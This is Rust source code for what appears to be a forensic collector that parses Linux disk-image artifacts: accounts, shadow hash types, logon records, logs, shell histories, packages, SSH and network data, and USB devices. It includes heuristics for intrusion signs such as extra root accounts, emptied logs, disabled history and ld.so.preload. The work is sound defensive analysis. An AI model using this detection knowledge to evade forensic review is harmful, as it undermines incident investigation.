    if dir == "/etc/netplan" && (name.ends_with(".yaml") || name.ends_with(".yml")) {
        return Some(Kind::NetIfaces);
    }
    if dir == "/boot" && (name.starts_with("vmlinuz-") || name.starts_with("config-")) {
        return Some(Kind::Kernel);
    }
    let user = !home_user(p).is_empty();
    let in_home = |rest: &str| -> bool {
        let parts: Vec<&str> = p.split('/').collect();
        let tail = if parts.get(1) == Some(&"root") { parts[2..].join("/") } else if matches!(parts.get(1), Some(&"home") | Some(&"Users")) && parts.len() > 3 { parts[3..].join("/") } else if parts.get(1) == Some(&"var") && parts.get(2) == Some(&"root") && parts.len() > 3 { parts[3..].join("/") } else { return false };
        tail == rest
    };
    if user {
        for (f, sh) in [(".bash_history", "bash"), (".zsh_history", "zsh"), (".history", "sh"), (".sh_history", "sh"), (".ash_history", "ash"), (".local/share/fish/fish_history", "fish"), (".python_history", "python"), (".mysql_history", "mysql"), (".psql_history", "psql"), (".sqlite_history", "sqlite")] {
            if in_home(f) {
                return Some(Kind::History(sh));
            }
        }
        if in_home(".ssh/authorized_keys") || in_home(".ssh/authorized_keys2") {
            return Some(Kind::AuthorizedKeys);
        }
        if in_home(".ssh/known_hosts") {
            return Some(Kind::KnownHosts);
        }
        if in_home(".bashrc") || in_home(".profile") || in_home(".bash_profile") || in_home(".bash_login") || in_home(".zshrc") || in_home(".bash_logout") {
            return Some(Kind::ShellRc);
        }
    }
    None
}

/// Reads one file through the file system, up to `cap` bytes, gunzipping .gz.
fn read_file<R: Read + Seek>(fs: &crate::fs::Fs, r: &mut R, f: &FileRow, cap: u64) -> anyhow::Result<Vec<u8>> {
    let d = fs.read(r, &f.e, "", 0, f.e.size.min(cap) as usize)?;
    if f.e.name.ends_with(".gz") {
        let mut out = vec![];
        flate2::read::MultiGzDecoder::new(&d[..]).take(MAX_GZ).read_to_end(&mut out)?;
        return Ok(out);
    }
    Ok(d)
}

pub fn collect<R: Read + Seek>(fs: &crate::fs::Fs, r: &mut R, files: &[FileRow], progress: crate::Progress) -> LinuxArtifacts {
    let mut a = LinuxArtifacts::default();
    // An ext volume, or a collection (tar, ZIP) that may hold a Linux system.
    // FAT and exFAT too: USB drives can carry FSEvents from a Mac.
    if !fs.is_ext() && !fs.is_collection() && !fs.is_mac() && !fs.is_fat() {
        return a;
    }
    if let crate::fs::Fs::Ext(v) = fs {
        a.computer.fs_created = v.created;
        a.computer.last_mounted = v.last_mounted.clone();
        a.computer.last_mount_time = v.mount_time;
    }
    let mut found: Vec<(usize, Kind)> = files.iter().enumerate().filter(|(_, f)| !f.e.is_dir).filter_map(|(i, f)| classify_path(&f.e.path).map(|k| (i, k))).collect();
    // Live copies first; within a kind, oldest rotation first so events come in order.
    found.sort_by_key(|(i, k)| (kind_order(*k), files[*i].e.deleted, std::cmp::Reverse(rotation(&files[*i].e.name)), *i));
    let by_path: HashMap<&str, usize> = files.iter().enumerate().filter(|(_, f)| !f.e.deleted).map(|(i, f)| (f.e.path.as_str(), i)).collect();

    // Time zone first: classic syslog lines need it.
    let mut zone = Zone::utc();
    let mut zone_named = String::new();
    for (i, k) in &found {
        let f = &files[*i];
        if f.e.deleted {
            continue;
        }
        match k {
            Kind::Timezone => {
                if let Ok(d) = read_file(fs, r, f, 4096) {
                    zone_named = text(&d).trim().to_string();
                }
            }
            Kind::Localtime => {
                // Usually a symlink into /usr/share/zoneinfo.
                let target = f.e.unix.as_ref().and_then(|u| u.link_target.clone());
                let (name, src) = match &target {
                    Some(t) => {
                        let abs = if t.starts_with('/') { t.clone() } else { normalize(&format!("/etc/{}", t)) };
                        let name = abs.split("zoneinfo/").nth(1).unwrap_or("").to_string();
                        (name, by_path.get(abs.as_str()).copied())
                    }
                    None => (String::new(), Some(*i)),
                };
                if let Some(j) = src {
                    if let Ok(d) = read_file(fs, r, &files[j], 1 << 20) {
                        if let Some(z) = Zone::parse(&d, &name) {
                            zone = z;
                        }
                    }
                } else if !name.is_empty() {
                    zone.name = name;
                }
            }
            _ => {}
        }
    }
    if (zone.name.is_empty() || zone.name.contains(',')) && !zone_named.is_empty() {
        zone.name = zone_named.clone();
    }
    a.computer.time_zone = if zone.trans.is_empty() && zone.rule.is_none() && zone.name != "UTC" { format!("{} (zone data not found; classic syslog times read as UTC)", if zone.name.is_empty() { &zone_named } else { &zone.name }) } else { zone.name.clone() };

    let total = found.len() as u64;
    let mut shadow: HashMap<String, (String, u64)> = HashMap::new();
    let mut groups: HashMap<String, Vec<String>> = HashMap::new();
    let mut lastlog: Option<Vec<u8>> = None;
    let mut dpkg_times: HashMap<String, (u64, String)> = HashMap::new();
    for (n, (i, kind)) in found.iter().copied().enumerate() {
        if !progress("Linux artifacts", n as u64, total) {
            break;
        }
        let f = &files[i];
        let mut src = Source { file: i as u32, path: f.e.path.clone(), deleted: f.e.deleted, kind: kind_name(kind).into(), ..Default::default() };
        let cap = match kind {
            Kind::Journal | Kind::Wtmp | Kind::Btmp | Kind::Lastlog => MAX_BINARY,
            Kind::Kernel => 0,
            _ => MAX_TEXT,
        };
        if matches!(kind, Kind::Journal | Kind::Wtmp | Kind::Btmp) && f.e.size > MAX_BINARY {
            src.error = Some(format!("{} bytes; larger than the {} byte limit", f.e.size, MAX_BINARY));
            a.sources.push(src);
            continue;
        }
        let data = if cap == 0 { Ok(vec![]) } else { read_file(fs, r, f, cap) };
        let d = match data {
            Ok(d) => d,
            Err(e) => {
                src.error = Some(format!("{:#}", e));
                a.sources.push(src);
                continue;
            }
        };
        if f.e.size > cap && cap > 0 {
            src.note = Some(format!("read the first {} MiB", cap >> 20));
        }
        let mtime = f.e.si.map(|t| t.modified).unwrap_or(0);
        let deleted_dup = f.e.deleted && found.iter().any(|(j, k)| *k == kind && !files[*j].e.deleted && files[*j].e.name == f.e.name && files[*j].e.path == f.e.path);
        match kind {
            Kind::OsRelease => {
                let kv = key_values(&text(&d));
                if a.computer.os.is_empty() {
                    a.computer.os = kv.get("PRETTY_NAME").or(kv.get("NAME")).cloned().unwrap_or_default();
                    a.computer.os_id = kv.get("ID").cloned().unwrap_or_default();
                    a.computer.version = kv.get("VERSION").or(kv.get("VERSION_ID")).cloned().unwrap_or_default();
                }
            }
            Kind::Hostname => {
                if a.computer.hostname.is_empty() {
                    a.computer.hostname = text(&d).lines().next().unwrap_or("").trim().to_string();
                }
            }
            Kind::MachineId => a.computer.machine_id = text(&d).trim().to_string(),
            Kind::Timezone | Kind::Localtime => {}
            Kind::Kernel => {
                let v = f.e.name.trim_start_matches("vmlinuz-").trim_start_matches("config-").to_string();
                if !a.computer.kernels.contains(&v) {
                    a.computer.kernels.push(v);
                }
            }
            Kind::Passwd => {
                if deleted_dup {
                    src.note = Some("older deleted copy; the live file is used".into());
                } else {
                    for l in text(&d).lines() {
                        let p: Vec<&str> = l.split(':').collect();
                        if p.len() < 7 || l.starts_with('#') {
                            continue;
                        }
                        let shell = p[6].trim().to_string();
                        let login_shell = !shell.ends_with("nologin") && !shell.ends_with("/false") && !shell.is_empty() && !shell.ends_with("/sync") && !shell.ends_with("/shutdown") && !shell.ends_with("/halt");
                        a.users.push(LinuxUser {
                            name: p[0].into(),
                            uid: p[2].parse().unwrap_or(u32::MAX),
                            gid: p[3].parse().unwrap_or(u32::MAX),
                            gecos: p[4].split(',').next().unwrap_or("").into(),
                            home: p[5].into(),
                            shell,
                            login_shell,
                            ..Default::default()
                        });
                    }
                }
            }
            Kind::Shadow => {
                if !deleted_dup {
                    for l in text(&d).lines() {
                        let p: Vec<&str> = l.split(':').collect();
                        if p.len() < 3 {
                            continue;
                        }
                        // The hash itself is never kept, only what kind it is.
                        let h = p[1];
                        let state = if h.is_empty() {
                            "none (no password needed)".to_string()
                        } else if h.starts_with('!') || h.starts_with('*') {
                            "locked".to_string()
                        } else {
                            let alg = match h.split('$').nth(1) {
                                Some("1") => "MD5",
                                Some("5") => "SHA-256",
                                Some("6") => "SHA-512",
                                Some("y") => "yescrypt",
                                Some("2a" | "2b" | "2y") => "bcrypt",
                                Some("7") => "scrypt",
                                Some("gy") => "gost-yescrypt",
                                _ => "DES or unknown",
                            };
                            format!("set ({})", alg)
                        };
                        let days: i64 = p[2].parse().unwrap_or(0);
                        shadow.insert(p[0].to_string(), (state, if days > 0 { ft(days * 86_400) } else { 0 }));
                    }
                }
            }
            Kind::Group => {
                if !deleted_dup {
                    for l in text(&d).lines() {
                        let p: Vec<&str> = l.split(':').collect();
                        if p.len() < 4 {
                            continue;
                        }
                        for m in p[3].split(',').map(str::trim).filter(|m| !m.is_empty()) {
                            groups.entry(m.to_string()).or_default().push(p[0].to_string());
                        }
                    }
                }
            }
            Kind::Lastlog => {
                if !f.e.deleted {
                    lastlog = Some(d);
                }
            }
            Kind::Wtmp | Kind::Btmp => {
                let n = utmp(&mut a, &d, kind == Kind::Btmp, i as u32);
                if n == 0 && f.e.size == 0 && !f.e.deleted && kind == Kind::Wtmp && rotation(&f.e.name) == 0 {
                    src.note = Some("empty".into());
                    a.hits.push(("linux_log_emptied".into(), i as u32));
                }
                a.logs.push(LogFile { file: i as u32, path: f.e.path.clone(), kind: kind_name(kind).into(), lines: n, events: n, deleted: f.e.deleted, ..Default::default() });
            }
            Kind::AuthLog | Kind::Syslog => {
                let s = text(&d);
                let lines = syslog_lines(&s, mtime, &zone);
                let mut lf = LogFile { file: i as u32, path: f.e.path.clone(), kind: kind_name(kind).into(), lines: lines.len() as u64, deleted: f.e.deleted, ..Default::default() };
                lf.first = lines.first().map(line_ft).unwrap_or(0);
                lf.last = lines.last().map(line_ft).unwrap_or(0);
                let mut usb: Vec<(String, BTreeMap<&'static str, String>, u64)> = vec![];
                for l in &lines {
                    let t = line_ft(l);
                    if l.prog == "kernel" {
                        kernel_usb(&mut usb, l.msg, t);
                    }
                    if let Some(ev) = event_from(l.prog, l.pid, l.msg, l.host, t, l.guessed, kind_name(kind), i as u32) {
                        lf.events += 1;
                        push_event(&mut a, ev);
                    }
                }
                finish_usb(&mut a, usb);
                if f.e.size == 0 && !f.e.deleted && rotation(&f.e.name) == 0 && kind == Kind::AuthLog && found.iter().any(|(j, k)| *k == kind && rotation(&files[*j].e.name) > 0 && files[*j].e.size > 0) {
                    lf.note = "empty while older rotations hold entries".into();
                    a.hits.push(("linux_log_emptied".into(), i as u32));
                }
                if lines.iter().any(|l| l.guessed) && lf.note.is_empty() {
                    lf.note = "year inferred; local times converted with the image's time zone".into();
                }
                a.logs.push(lf);
            }
            Kind::Journal => {
                let mut lf = LogFile { file: i as u32, path: f.e.path.clone(), kind: "journal".into(), deleted: f.e.deleted, ..Default::default() };
                match journal(&d) {
                    Ok(j) => {
                        lf.lines = j.entries.len() as u64;
                        lf.first = j.entries.first().map(|e| e.0).unwrap_or(0);
                        lf.last = j.entries.last().map(|e| e.0).unwrap_or(0);
                        if j.compressed > 0 {
                            lf.note = format!("{} compressed field(s) could not be decoded", j.compressed);
                        }
                        if j.dirty {
                            lf.note = [lf.note.as_str(), "not closed cleanly"].iter().filter(|s| !s.is_empty()).cloned().collect::<Vec<_>>().join("; ");
                        }
                        let mut usb: Vec<(String, BTreeMap<&'static str, String>, u64)> = vec![];
                        for (t, fields) in &j.entries {
                            let g = |k: &str| fields.iter().find(|(n, _)| n == k).map(|x| x.1.as_str()).unwrap_or("");
                            let prog = if !g("SYSLOG_IDENTIFIER").is_empty() { g("SYSLOG_IDENTIFIER") } else { g("_COMM") };
                            let msg = g("MESSAGE");
                            if prog == "kernel" {
                                kernel_usb(&mut usb, msg, *t);
                            }
                            if let Some(ev) = event_from(prog, g("_PID"), msg, g("_HOSTNAME"), *t, false, "journal", i as u32) {
                                lf.events += 1;
                                push_event(&mut a, ev);
                            }
                            if a.computer.hostname.is_empty() && !g("_HOSTNAME").is_empty() {
                                a.computer.hostname = g("_HOSTNAME").to_string();
                            }
                        }
                        finish_usb(&mut a, usb);
                    }
                    Err(e) => src.error = Some(format!("{:#}", e)),
                }
                a.logs.push(lf);
            }
            Kind::History(sh) => history(&mut a, &d, sh, f, i as u32),
            Kind::DpkgStatus => {
                for para in text(&d).split("\n\n") {
                    let kv = deb_fields(para);
                    if !kv.get("Status").map(|s| s.ends_with(" installed")).unwrap_or(false) {
                        continue;
                    }
                    a.packages.push(Package {
                        name: kv.get("Package").cloned().unwrap_or_default(),
                        version: kv.get("Version").cloned().unwrap_or_default(),
                        arch: kv.get("Architecture").cloned().unwrap_or_default(),
                        manager: "dpkg".into(),
                        description: kv.get("Description").map(|d| d.lines().next().unwrap_or("").to_string()).unwrap_or_default(),
                        ..Default::default()
                    });
                }
            }
            Kind::DpkgLog => {
                // 2026-10-20 08:05:30 install nmap:amd64 <none> 7.94+git
                for l in text(&d).lines() {
                    let p: Vec<&str> = l.split_whitespace().collect();
                    if p.len() < 5 || !matches!(p[2], "install" | "upgrade" | "remove" | "purge") {
                        continue;
                    }
                    let Some(t) = local_ymd_hms(p[0], p[1], &zone) else { continue };
                    let name = p[3].split(':').next().unwrap_or("").to_string();
                    let ver = p.get(5).copied().unwrap_or(p[4]).to_string();
                    if p[2] == "install" {
                        dpkg_times.entry(name.clone()).or_insert((t, String::new()));
                    }
                    a.timeline.push(WinTime { t, kind: "INST".into(), what: format!("{} {}", p[2], name), detail: format!("dpkg {} {}", p[2], ver) });
                }
            }
            Kind::AptHistory => apt_history(&mut a, &text(&d), &zone, &mut dpkg_times, i as u32),
            Kind::DnfLog | Kind::YumLog => {
                for l in text(&d).lines() {
                    // dnf.rpm.log: 2026-10-20T08:05:30+0000 SUBDEBUG Installed: nmap-7.92-1.x86_64
                    // yum.log:     Oct 20 08:05:30 Installed: nmap-7.92-1.x86_64
                    let (t, rest) = if kind == Kind::DnfLog {
                        let Some((ts, rest)) = l.split_once(' ') else { continue };
                        let Ok(t) = chrono::DateTime::parse_from_str(ts, "%Y-%m-%dT%H:%M:%S%z") else { continue };
                        (ft(t.timestamp()), rest)
                    } else {
                        let lines = syslog_lines(l, mtime, &zone);
                        let Some(x) = lines.first() else { continue };
                        (line_ft(x), l.get(16..).unwrap_or(""))
                    };
                    for verb in ["Installed: ", "Erased: ", "Upgraded: ", "Updated: "] {
                        if let Some(p) = rest.split(verb).nth(1) {
                            let pkg = p.split_whitespace().next().unwrap_or("").to_string();
                            if verb == "Installed: " {
                                a.packages.push(Package { name: pkg.clone(), manager: "rpm".into(), installed: t, ..Default::default() });
                            }
                            a.timeline.push(WinTime { t, kind: "INST".into(), what: format!("{} {}", verb.trim_end_matches(": ").to_lowercase(), pkg), detail: kind_name(kind).into() });
                        }
                    }
                }
            }
            Kind::Apk => {
                for para in text(&d).split("\n\n") {
                    let g = |k: &str| para.lines().find_map(|l| l.strip_prefix(k)).unwrap_or("").to_string();
                    if g("P:").is_empty() {
                        continue;
                    }
                    a.packages.push(Package { name: g("P:"), version: g("V:"), arch: g("A:"), manager: "apk".into(), description: g("T:"), ..Default::default() });
                }
            }
            Kind::Pacman => {
                let s = text(&d);
                let g = |k: &str| s.split(&format!("%{}%\n", k)).nth(1).and_then(|r| r.lines().next()).unwrap_or("").to_string();
                let t = ft(g("INSTALLDATE").parse().unwrap_or(0));
                a.packages.push(Package { name: g("NAME"), version: g("VERSION"), arch: g("ARCH"), manager: "pacman".into(), installed: t, description: g("DESC"), ..Default::default() });
            }
            Kind::Cron | Kind::CronDir | Kind::Systemd | Kind::RcLocal | Kind::AuthorizedKeys | Kind::Sudoers | Kind::Preload | Kind::ShellRc => persistence(&mut a, kind, &text(&d), f, i as u32),
            Kind::KnownHosts => {
                let user = home_user(&f.e.path);
                let mut hashed = 0;
                for l in text(&d).lines().filter(|l| !l.trim().is_empty() && !l.starts_with('#')) {
                    let host = l.split_whitespace().next().unwrap_or("");
                    if host.starts_with("|1|") {
                        hashed += 1;
                        continue;
                    }
                    let key = l.split_whitespace().nth(1).unwrap_or("").to_string();
                    a.networks.push(NetworkProfile { name: host.to_string(), description: format!("{} connected over SSH", user), kind: "SSH known host".into(), category: key, ..Default::default() });
                }
                if hashed > 0 {
                    src.note = Some(format!("{} hashed host name(s) (HashKnownHosts) not listed", hashed));
                }
            }
            Kind::NmConnection => {
                let kv = ini(&text(&d));
                let g = |k: &str| kv.get(k).cloned().unwrap_or_default();
                let ssid = g("wifi.ssid");
                a.networks.push(NetworkProfile {
                    name: if ssid.is_empty() { g("connection.id") } else { ssid },
                    description: g("connection.id"),
                    kind: g("connection.type"),
                    category: if g("wifi-security.key-mgmt").is_empty() { String::new() } else { format!("security {}", g("wifi-security.key-mgmt")) },
                    created: 0,
                    last_connected: ft(g("connection.timestamp").parse().unwrap_or(0)),
                    gateway_mac: g("wifi.seen-bssids"),
                    dns_suffix: g("ipv4.dns-search"),
                });
                if !g("ipv4.address1").is_empty() {
                    a.interfaces.push(NetInterface { guid: g("connection.id"), ip: g("ipv4.address1"), gateway: g("ipv4.gateway"), ..Default::default() });
                }
                let t = ft(g("connection.timestamp").parse().unwrap_or(0));
                if t > 0 {
                    a.timeline.push(WinTime { t, kind: "NET".into(), what: g("connection.id"), detail: format!("NetworkManager {} last connected", g("connection.type")) });
                }
            }
            Kind::DhcpLease => dhcp(&mut a, &text(&d), &f.e.name),
            Kind::Hosts => {
                for l in text(&d).lines() {
                    let l = l.split('#').next().unwrap_or("").trim();
                    let mut p = l.split_whitespace();
                    let (Some(ip), names) = (p.next(), p.collect::<Vec<_>>()) else { continue };
                    if names.is_empty() || names.iter().all(|n| n.contains("localhost") || n.starts_with("ip6-") || *n == a.computer.hostname) || ip == "127.0.1.1" {
                        continue;
                    }
                    a.networks.push(NetworkProfile { name: names.join(" "), description: ip.to_string(), kind: "hosts file entry".into(), ..Default::default() });
                }
            }
            Kind::NetIfaces => {
                let s = text(&d);
                for l in s.lines() {
                    let t = l.trim();
                    if let Some(x) = t.strip_prefix("address ").or_else(|| t.strip_prefix("- ").filter(|x| x.contains('/') && x.chars().next().is_some_and(|c| c.is_ascii_digit()))) {
                        a.interfaces.push(NetInterface { guid: f.e.path.clone(), ip: x.trim().to_string(), ..Default::default() });
                    }
                }
            }
        }
        a.sources.push(src);
    }

    // Accounts: shadow, groups, lastlog, logons.
    for u in a.users.iter_mut() {
        if let Some((st, changed)) = shadow.get(&u.name) {
            u.password = st.clone();
            u.password_changed = *changed;
        }
        u.groups = groups.get(&u.name).cloned().unwrap_or_default();
        u.admin = u.uid == 0 || u.groups.iter().any(|g| matches!(g.as_str(), "sudo" | "wheel" | "admin" | "root"));
        if u.uid == 0 && u.name != "root" {
            u.note = "uid 0: a second root account".into();
        } else if u.uid < 1000 && u.login_shell && u.uid != 0 && !matches!(u.name.as_str(), "sync" | "shutdown" | "halt") {
            u.note = "system account with a login shell".into();
        } else if u.password.starts_with("none") && u.login_shell {
            u.note = "can log in without a password".into();
        }
        if let Some(ll) = &lastlog {
            let o = u.uid as usize * 292;
            if let Some(rec) = ll.get(o..o + 292) {
                let t = u32le(rec, 0) as i64;
                if t > 0 {
                    u.last_logon = ft(t);
                    u.last_from = cstr(&rec[36..292]);
                    if u.last_from.is_empty() {
                        u.last_from = cstr(&rec[4..36]);
                    }
                }
            }
        }
    }
    for l in &a.logons {
        if let Some(u) = a.users.iter_mut().find(|u| u.name == l.user) {
            match l.kind.as_str() {
                "logon" => {
                    u.logons += 1;
                    if l.time > u.last_logon {
                        u.last_logon = l.time;
                        u.last_from = l.from.clone();
                    }
                }
                "failed" => u.failed += 1,
                _ => {}
            }
        }
    }
    // Interesting accounts first: those that can log in.
    a.users.sort_by_key(|u| (!(u.login_shell || u.uid == 0), u.uid));
    for p in a.packages.iter_mut() {
        if p.installed == 0 {
            if let Some((t, by)) = dpkg_times.get(&p.name) {
                p.installed = *t;
                p.by = by.clone();
            }
        }
    }
    a.packages.sort_by(|x, y| y.installed.cmp(&x.installed).then(x.name.cmp(&y.name)));
    a.packages.dedup_by(|x, y| x.name == y.name && x.version == y.version && x.manager == y.manager);
    for l in &a.logons {
        match l.kind.as_str() {
            "reboot" => a.computer.last_boot = a.computer.last_boot.max(l.time),
            "shutdown" => a.computer.last_shutdown = a.computer.last_shutdown.max(l.time),
            _ => {}
        }
    }
    for e in a.events.iter().filter(|e| e.category == "Boot") {
        if e.summary.starts_with("System booted") {
            a.computer.last_boot = a.computer.last_boot.max(e.time);
        } else {
            a.computer.last_shutdown = a.computer.last_shutdown.max(e.time);
        }
    }
    if crate::macos::is_mac(files) {
        crate::macos::collect(fs, r, files, &mut a);
    }
    a.events.sort_by_key(|e| e.time);
    a.logons.sort_by_key(|l| l.time);
    // FSEvents changes have no time of their own: not on the timeline.
    for e in a.events.iter().filter(|e| e.source != "FSEvents") {
        a.timeline.push(WinTime { t: e.time, kind: if e.category == "USB" { "USB" } else { "EVT" }.into(), what: e.summary.clone(), detail: format!("{}: {}", e.source, e.category) });
    }
    for l in a.logons.iter().filter(|l| l.source != "auth log" && l.source != "journal") {
        a.timeline.push(WinTime { t: l.time, kind: "EVT".into(), what: format!("{} {}{}", l.kind, l.user, if l.from.is_empty() { String::new() } else { format!(" from {}", l.from) }), detail: format!("{} {}", l.source, l.tty) });
    }
    for c in a.commands.iter().filter(|c| c.time > 0) {
        a.timeline.push(WinTime { t: c.time, kind: "EXEC".into(), what: c.command.clone(), detail: format!("{} history of {}", c.shell, c.user) });
    }
    a.timeline.retain(|t| t.t > 0);
    a.timeline.sort_by_key(|t| t.t);
    for c in a.commands.iter().filter(|c| !c.flag.is_empty()) {
        a.hits.push(("linux_antiforensic_command".into(), c.file));
    }
    for p in a.persistence.iter().filter(|p| p.kind == "ld.so.preload") {
        a.hits.push(("ld_preload".into(), p.file));
    }
    a
}

fn kind_order(k: Kind) -> u8 {
    match k {
        Kind::Passwd | Kind::Shadow | Kind::Group => 0,
        Kind::Timezone | Kind::Localtime | Kind::OsRelease | Kind::Hostname | Kind::MachineId => 1,
        _ => 2,
    }
}

/// Rotation number: auth.log = 0, auth.log.1 = 1, auth.log.2.gz = 2.
fn rotation(name: &str) -> u32 {
    let n = name.strip_suffix(".gz").unwrap_or(name);
    n.rsplit_once('.').and_then(|(_, d)| d.parse().ok()).unwrap_or(0)
}

fn normalize(p: &str) -> String {
    let mut out: Vec<&str> = vec![];
    for part in p.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                out.pop();
            }
            x => out.push(x),
        }
    }
    format!("/{}", out.join("/"))
}

fn key_values(s: &str) -> HashMap<String, String> {
    s.lines()
        .filter_map(|l| l.split_once('='))
        .map(|(k, v)| (k.trim().to_string(), v.trim().trim_matches('"').trim_matches('\'').to_string()))
        .collect()
}

/// INI as "section.key" -> value.
fn ini(s: &str) -> HashMap<String, String> {
    let mut sec = String::new();
    let mut out = HashMap::new();
    for l in s.lines() {
        let l = l.trim();
        if l.starts_with('[') && l.ends_with(']') {
            sec = l[1..l.len() - 1].to_string();
        } else if let Some((k, v)) = l.split_once('=') {
            out.insert(format!("{}.{}", sec, k.trim()), v.trim().to_string());
        }
    }
    out
}

fn deb_fields(para: &str) -> HashMap<String, String> {
    let mut out: HashMap<String, String> = HashMap::new();
    let mut last = String::new();
    for l in para.lines() {
        if l.starts_with(' ') {
            if let Some(v) = out.get_mut(&last) {
                v.push('\n');
                v.push_str(l.trim());
            }
        } else if let Some((k, v)) = l.split_once(':') {
            last = k.to_string();
            out.insert(last.clone(), v.trim().to_string());
        }
    }
    out
}

/// "2026-10-20" "08:05:30" in the machine's local time.
fn local_ymd_hms(d: &str, t: &str, zone: &Zone) -> Option<u64> {
    let dt = chrono::NaiveDateTime::parse_from_str(&format!("{} {}", d, t), "%Y-%m-%d %H:%M:%S").ok()?;
    Some(ft(zone.to_utc(dt.and_utc().timestamp())))
}

#[allow(clippy::too_many_arguments)]
fn event_from(prog: &str, _pid: &str, msg: &str, host: &str, t: u64, guessed: bool, source: &str, file: u32) -> Option<(LinuxEvent, Option<Logon>)> {
    let (cat, summary, user, ip, logon, how) = classify(prog, msg)?;
    let ev = LinuxEvent { time: t, category: cat.into(), summary, program: prog.into(), host: host.into(), user: user.clone(), ip: ip.clone(), message: msg.chars().take(2000).collect(), source: source.into(), file, year_guessed: guessed };
    let lo = (!logon.is_empty()).then(|| Logon { time: t, user, kind: logon.into(), how: how.into(), from: ip, source: source.into(), file, ..Default::default() });
    Some((ev, lo))
}

fn push_event(a: &mut LinuxArtifacts, (ev, lo): (LinuxEvent, Option<Logon>)) {
    if a.events.len() >= MAX_EVENTS {
        return;
    }
    // The same line often reaches both the journal and auth.log.
    if (ev.source == "journal" || a.events.iter().rev().take(64).any(|e| e.source == "journal"))
        && a.events.iter().rev().take(256).any(|e| e.time / 10_000_000 == ev.time / 10_000_000 && e.message == ev.message && e.source != ev.source)
    {
        return;
    }
    if ev.category == "Sudo" {
        a.commands.push(ShellCommand { user: ev.user.clone(), shell: "sudo".into(), command: ev.summary.split(": ").skip(1).collect::<Vec<_>>().join(": "), time: ev.time, file: ev.file, flag: notable_command(&ev.message).unwrap_or("").into(), ..Default::default() });
    }
    if let Some(l) = lo {
        a.logons.push(l);
    }
    a.events.push(ev);
}

/// Kernel USB lines: "usb 1-1: New USB device found, idVendor=0781, idProduct=5581",
/// then Product, Manufacturer and SerialNumber lines for the same port.
fn kernel_usb(usb: &mut Vec<(String, BTreeMap<&'static str, String>, u64)>, msg: &str, t: u64) {
    // syslog copies of kernel lines start with "[  900.101010] ".
    let msg = if msg.starts_with('[') { msg.split_once("] ").map(|x| x.1).unwrap_or(msg) } else { msg };
    let Some(rest) = msg.strip_prefix("usb ") else { return };
    let Some((port, what)) = rest.split_once(": ") else { return };
    if what.starts_with("New USB device found") {
        let mut m = BTreeMap::new();
        for kv in what.split(", ") {
            if let Some((k, v)) = kv.split_once('=') {
                match k.trim() {
                    "idVendor" | "New USB device found, idVendor" => {
                        m.insert("vendor_id", v.trim().to_string());
                    }
                    "idProduct" => {
                        m.insert("product_id", v.trim().to_string());
                    }
                    _ => {}
                }
            }
        }
        if let Some(v) = what.split("idVendor=").nth(1) {
            m.insert("vendor_id", v.split(',').next().unwrap_or("").trim().to_string());
        }
        usb.push((port.to_string(), m, t));
    } else if let Some(x) = usb.iter_mut().rev().find(|x| x.0 == port) {
        for (key, field) in [("Product: ", "product"), ("Manufacturer: ", "vendor"), ("SerialNumber: ", "serial")] {
            if let Some(v) = what.strip_prefix(key) {
                x.1.insert(field, v.trim().to_string());
            }
        }
    }
}

fn finish_usb(a: &mut LinuxArtifacts, usb: Vec<(String, BTreeMap<&'static str, String>, u64)>) {
    for (_, m, t) in usb {
        let g = |k: &str| m.get(k).cloned().unwrap_or_default();
        // Hubs and built-in devices have no serial; storage devices nearly always do.
        if g("serial").is_empty() {
            continue;
        }
        let name = format!("{} {}", g("vendor"), g("product")).trim().to_string();
        let key = (g("vendor_id"), g("product_id"), g("serial"));
        match a.usb.iter_mut().find(|u| (u.revision.clone(), u.name.clone(), u.serial.clone()) == (format!("{}:{}", key.0, key.1), name.clone(), key.2.clone())) {
            Some(u) => {
                u.first_connected = if u.first_connected == 0 { t } else { u.first_connected.min(t) };
                u.last_connected = u.last_connected.max(t);
            }
            None => {
                a.usb.push(UsbDevice { vendor: g("vendor"), product: g("product"), revision: format!("{}:{}", key.0, key.1), serial: key.2.clone(), name: name.clone(), first_connected: t, last_connected: t, ..Default::default() });
                if a.events.len() < MAX_EVENTS {
                    a.events.push(LinuxEvent { time: t, category: "USB".into(), summary: format!("USB device connected: {} (serial {})", name, key.2), program: "kernel".into(), source: "kernel log".into(), ..Default::default() });
                }
            }
        }
    }
}

/// utmp records (wtmp: logons, logouts, reboots, shutdowns; btmp: failures).
fn utmp(a: &mut LinuxArtifacts, d: &[u8], failed: bool, file: u32) -> u64 {
    const REC: usize = 384;
    let mut n = 0;
    let mut open: HashMap<String, usize> = HashMap::new();
    for rec in d.chunks_exact(REC) {
        let ty = u32le(rec, 0) & 0xFFFF;
        if ty == 0 || ty > 9 {
            continue;
        }
        let line = cstr(&rec[8..40]);
        let user = cstr(&rec[44..76]);
        let host = cstr(&rec[76..332]);
        let t = ft(i32le(rec, 340)) + (u32le(rec, 344).min(999_999) * 10);
        if t == 0 {
            continue;
        }
        n += 1;
        let source = if failed { "btmp" } else { "wtmp" };
        let mk = |kind: &str| Logon { time: t, user: user.clone(), kind: kind.into(), how: if line.starts_with("pts") { "terminal" } else if line.starts_with("tty") { "console" } else { "" }.into(), from: host.clone(), tty: line.clone(), source: source.into(), file, ..Default::default() };
        match ty {
            2 if user == "reboot" => a.logons.push(Logon { kind: "reboot".into(), from: host.clone(), ..mk("reboot") }),
            1 if user == "shutdown" => a.logons.push(mk("shutdown")),
            6 | 7 if failed => a.logons.push(mk("failed")),
            7 => {
                open.insert(line.clone(), a.logons.len());
                a.logons.push(mk("logon"));
            }
            8 => {
                if let Some(i) = open.remove(&line) {
                    if let Some(l) = a.logons.get_mut(i) {
                        l.end = t;
                    }
                }
            }
            _ => {}
        }
    }
    n
}

fn history(a: &mut LinuxArtifacts, d: &[u8], shell: &str, f: &FileRow, file: u32) {
    let user = home_user(&f.e.path);
    // A history file pointed at /dev/null records nothing.
    if f.e.unix.as_ref().and_then(|u| u.link_target.as_deref()) == Some("/dev/null") {
        a.hits.push(("shell_history_cleared".into(), file));
        a.persistence.push(Persistence { kind: "history disabled".into(), location: f.e.path.clone(), name: f.e.name.clone(), command: "symlink to /dev/null".into(), user: user.clone(), unusual: true, reason: "the shell history is discarded".into(), file, ..Default::default() });
        return;
    }
    if d.is_empty() && !f.e.deleted && shell == "bash" {
        a.hits.push(("shell_history_cleared".into(), file));
    }
    let s = text(d);
    let mut t = 0u64;
    let push = |a: &mut LinuxArtifacts, cmd: &str, t: u64, line: usize| {
        if cmd.trim().is_empty() || a.commands.len() >= MAX_COMMANDS {
            return;
        }
